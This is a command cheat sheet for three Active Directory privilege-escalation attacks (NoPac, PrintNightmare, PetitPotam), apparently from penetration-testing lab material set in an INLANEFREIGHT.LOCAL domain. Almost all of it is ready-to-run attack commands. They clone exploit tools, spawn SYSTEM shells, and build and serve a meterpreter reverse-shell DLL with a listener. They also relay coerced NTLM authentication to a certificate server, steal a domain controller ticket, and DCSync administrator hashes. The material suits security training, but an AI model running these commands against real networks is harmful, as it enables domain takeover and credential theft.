# Bleeding Edge Vulnerabilities

## 1. NoPac (SamAccountName Spoofing)

Exploits CVE-2021-42278 and CVE-2021-42287 for Domain Admin privilege escalation.

### NoPac Retrieval

```bash
git clone https://github.com/Ridter/noPac.git
cd noPac
```

### Vulnerability Scan

```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

### SYSTEM Shell

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

### DCSync Extraction

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

---

## 2. PrintNightmare (Print Spooler RCE)

Exploits CVE-2021-34527 and CVE-2021-1675 for SYSTEM-level remote code execution.

### Exploit Retrieval

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
cd CVE-2021-1675
```

### Impacket Setup (cube0x0)

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 setup.py install
```

### Print Spooler Enumeration

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

### Payload Generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

### SMB Hosting

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

### Listener Setup

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

### Exploitation

```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

### Verify Execution

```bash
shell
whoami
```

---

## 3. PetitPotam (MS-EFSRPC NTLM Relay)

Exploits CVE-2021-36942 to coerce domain controller authentication for AD CS NTLM relay.

### NTLM Relay Setup

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Trigger Authentication

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

### Request Domain Controller TGT

```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

### Load Ticket

```bash
export KRB5CCNAME=dc01.ccache
```

### DCSync

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
